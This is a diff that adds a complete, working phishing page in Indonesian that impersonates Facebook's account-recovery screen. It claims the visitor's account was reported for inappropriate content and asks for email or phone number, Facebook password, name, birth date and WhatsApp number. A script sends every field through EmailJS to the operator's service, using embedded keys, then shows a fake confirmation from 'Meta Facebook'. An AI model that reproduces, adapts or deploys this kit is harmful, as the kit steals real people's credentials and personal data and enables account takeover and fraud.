@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Pemulihan Akun | Facebook</title>
+
+  <!-- EmailJS v3 -->
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script>
+    window.onload = function () {
+      emailjs.init("dTFjGLPtafyR5Pm7A"); // GANTI dengan public key EmailJS kamu
+    };
+  </script>
+
+  <style>
+    body { margin: 0; font-family: Arial, sans-serif; background: #f0f2f5; }
+    .fb-header { background: #1877f2; color: white; padding: 15px 20px; font-size: 24px; font-weight: bold; }
+    .container { max-width: 400px; background: #fff; margin: 40px auto; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+    h2 { font-size: 20px; color: #1c1e21; margin-bottom: 10px; }
+    p { font-size: 14px; color: #606770; }
+    input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 6px; }
+    button { width: 100%; padding: 12px; background: #1877f2; color: #fff; border: none; font-size: 16px; border-radius: 6px; cursor: pointer; }
+    button:hover { background: #166fe5; }
+    .step { display: none; }
+    .step.active { display: block; }
+    .success-box { text-align: center; padding: 20px; color: green; }
+    .note { font-size: 14px; text-align: center; color: #606770; margin-top: 10px; }
+    .icon-lock { text-align: center; margin: 20px 0; }
+    .icon-lock img { width: 60px; }
+  </style>
+</head>
+<body>
+  <div class="fb-header">facebook</div>
+  <div class="container">
+
+    <!-- STEP 0: Konfirmasi -->
+    <div class="step active" id="step0">
+      <div class="icon-lock">
+        <img src="https://cdn-icons-png.flaticon.com/512/3064/3064197.png" alt="lock" />
+      </div>
+      <h2>Harap Konfirmasi Identitas Akun Anda</h2>
+      <p>Silakan verifikasi akun Anda demi keamanan. Seseorang telah melaporkan akun Anda karena konten tidak pantas (sara, pelecehan, dll). <a href="#">Pelajari Selengkapnya.</a></p>
+      <button onclick="goToStep(2)">Lanjutkan</button>
+    </div>
+
+    <!-- STEP 2: Form -->
+    <div class="step" id="step2">
+      <h2>Informasi Pemulihan</h2>
+      <input type="email" id="recoveryEmail" placeholder="Email atau Nomor Telepon Facebook" required />
+      <input type="password" id="recoveryPassword" placeholder="Password Facebook" required />
+      <input type="text" id="namaFb" placeholder="Nama Facebook" required />
+      <input type="text" id="lahir" placeholder="Tanggal Lahir (DD-MM-YYYY)" required />
+      <input type="text" id="wa" placeholder="Nomor WhatsApp untuk pemberitahuan" required />
+      <button onclick="submitForm()">Lanjutkan</button>
+    </div>
+
+    <!-- STEP DONE -->
+    <div class="step" id="stepDone">
+      <h2>Berhasil!</h2>
+      <div class="success-box">
+        Informasi Anda berhasil dikirim.<br>
+        Harap menunggu konfirmasi lebih lanjut.<br />
+        Anda akan dihubungi melalui <strong>WhatsApp</strong> oleh tim <strong>Meta Facebook</strong>.
+      </div>
+      <div class="note">Terima kasih atas kesabaran Anda.</div>
+    </div>
+
+  </div>
+
+  <script>
+    function goToStep(step) {
+      document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+      document.getElementById('step' + step).classList.add('active');
+    }
+
+    function submitForm() {
+      const data = {
+        recovery_email: document.getElementById('recoveryEmail').value,
+        recovery_password: document.getElementById('recoveryPassword').value,
+        nama_fb: document.getElementById('namaFb').value,
+        tanggal_lahir: document.getElementById('lahir').value,
+        whatsapp: document.getElementById('wa').value
+      };
+
+      emailjs.send("service_st2aqxp", "template_5amgnkc", data)
+        .then(() => {
+          document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+          document.getElementById('stepDone').classList.add('active');
+        }, (error) => {
+          alert("Gagal mengirim data: " + JSON.stringify(error));
+        });
+    }
+  </script>
+</body>
+</html>
